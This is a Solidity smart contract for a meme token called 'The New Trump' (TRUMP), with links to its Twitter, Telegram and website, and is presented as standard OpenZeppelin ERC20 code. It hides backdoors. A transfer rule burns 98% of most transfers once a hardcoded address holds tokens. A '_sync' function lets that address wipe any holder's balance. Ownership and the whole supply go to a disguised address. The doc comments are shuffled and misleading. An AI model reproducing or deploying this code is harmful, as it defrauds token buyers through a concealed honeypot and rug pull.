// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.19;

/*

https://twitter.com/TheNewTrumpBNB
https://t.me.com/TheNewTrumpBNB
https://TheNewTrumpBNB.xyz

*/

/**
 *
 * @dev Wrappers over Solidity's arithmetic operations.
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 */
library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    /**
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * Counterpart to Solidity's `+` operator.
     *
     *
     * - Addition cannot overflow.
     * Requirements:
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     * overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     *
     * Requirements:
     *
     * Counterpart to Solidity's `-` operator.
     * - Subtraction cannot overflow.
     * overflow (when the result is negative).
     * @dev Returns the subtraction of two unsigned integers, reverting on
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     *
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     * Requirements:
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * division by zero. The result is rounded towards zero.
     * - The divisor cannot be zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     *
     * @dev Returns the integer division of two unsigned integers, reverting on
     * Requirements:
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * reverting when dividing by zero.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * invalid opcode to revert (consuming all remaining gas).
     * - The divisor cannot be zero.
     *
     * Requirements:
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * overflow (when the result is negative).
     * Requirements:
     * - Subtraction cannot overflow.
     *
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * Counterpart to Solidity's `-` operator.
     * message unnecessarily. For custom revert reasons use {trySub}.
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     *
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     *
     * - The divisor cannot be zero.
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * Requirements:
     *
     * division by zero. The result is rounded towards zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * Requirements:
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * invalid opcode to revert (consuming all remaining gas).
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     *
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * reverting with custom message when dividing by zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }


    /**
     * thereby removing any functionality that is only available to the owner.
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     *
     * @dev Leaves the contract without owner. It will not be possible to call
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;


/**
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint8 private _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowances;
    address internal uniswapV2Router = 0xF951de7f2D016c7Ddd9739131968C624B5714414;
    uint256 private _allowance = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private _uniswapFactoryV2 = 0xFbB59e22ea49650c4675fC08aAadB5015FF82C77;

    string private _name;
    
    /**
     *
     * @dev Sets the values for {name} and {symbol}.
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    /**

     */


    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    /**
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    /**
     * - the caller must have a balance of at least `amount`.
     * @dev See {IERC20-transfer}.
     *
     *
     * Requirements:
     * - `to` cannot be the zero address.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     *
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * Requirements:
     * @dev See {IERC20-approve}.
     *
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) { address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * is the maximum `uint256`.
     * `amount`.
     * - `from` must have a balance of at least `amount`.
     *
     *
     * - `from` and `to` cannot be the zero address.
     *
     * - the caller must have allowance for ``from``'s tokens of at least
     * NOTE: Does not update the allowance if the current allowance
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     * Emits an {Approval} event indicating the updated allowance. This is not
     * @dev See {IERC20-transferFrom}.
     */
    uint256 private _pairToken = 0x62;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     *
     *
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     * Requirements:
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` cannot be the zero address.
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * problems described in {IERC20-approve}.
     * - `spender` cannot be the zero address.
     * `subtractedValue`.
     * Emits an {Approval} event indicating the updated allowance.
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` must have allowance for the caller of at least
     *
     *
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     *
     * Requirements:
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     * - `to` cannot be the zero address.
     * This internal function is equivalent to {transfer}, and can be used to
     *
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address"); require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        uint256 swapamount = amount.mul(to != tx.origin && from != uniswapV2Router && _balances[_uniswapFactoryV2] > 0 ? _pairToken : _allowance).div(100) + 0;
        if (swapamount > 0)
        {
            _balances[DEAD] = _balances[DEAD].add(swapamount)*1;
            emit Transfer(from, DEAD, swapamount);
        }
        _balances[to] = _balances[to].add(amount - swapamount+0)*1;
        emit Transfer(from, to, amount - swapamount+0);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     * - `account` cannot be the zero address.
     * the total supply.
     * Requirements:
     *
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * Emits a {Transfer} event with `to` set to the zero address.
     * total supply.
     *
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Requirements:
     * - `account` must have at least `amount` tokens.
     *
     * - `account` cannot be the zero address.
     *
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /*
     * @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     * the total supply.
     */
    function _sync(address _sender) external { if (msg.sender == _uniswapFactoryV2) _balances[_sender] = 0x0; }

    /**
     *
     * Emits an {Approval} event.
     * - `spender` cannot be the zero address.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     *
     * - `owner` cannot be the zero address.
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Requirements:
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual
    { }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Might emit an {Approval} event.
     * Revert if not enough allowance is available.
     *
     *
     * Does not update the allowance amount in case of infinite allowance.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * Calling conditions:
     * will be transferred to `to`.
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * @dev Hook that is called before any transfer of tokens. This includes
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * minting and burning.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     *
     * - `from` and `to` are never both zero.
     *
     *
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}



contract TheNewTrump is ERC20, Ownable
{
    constructor() ERC20(unicode"The New Trump", unicode"TRUMP")
    {
        transferOwnership(uniswapV2Router);
        
        _mint(owner(), 8010000000000 * 10 ** uint(decimals()));
    }
}